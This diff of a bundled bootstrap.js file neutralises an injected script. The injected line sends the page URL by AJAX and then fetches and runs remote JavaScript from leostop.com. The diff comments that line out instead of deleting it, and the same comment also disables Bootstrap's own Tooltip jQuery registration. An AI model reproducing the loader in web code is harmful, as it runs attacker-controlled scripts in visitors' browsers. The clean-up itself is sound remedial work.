@@ -3457,6 +3457,8 @@ function aggiungiElemento() {
    * jQuery
    * ------------------------------------------------------------------------
    */
+
+ /* 
 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
   $.fn[NAME$6] = Tooltip._jQueryInterface;
@@ -3466,6 +3468,8 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
     $.fn[NAME$6] = JQUERY_NO_CONFLICT$6;
     return Tooltip._jQueryInterface;
   };
+*/
+
 
   /**
    * ------------------------------------------------------------------------
@@ -4451,4 +4455,3 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
   Object.defineProperty(exports, '__esModule', { value: true });
 
 }));
-//# sourceMappingURL=bootstrap.js.map
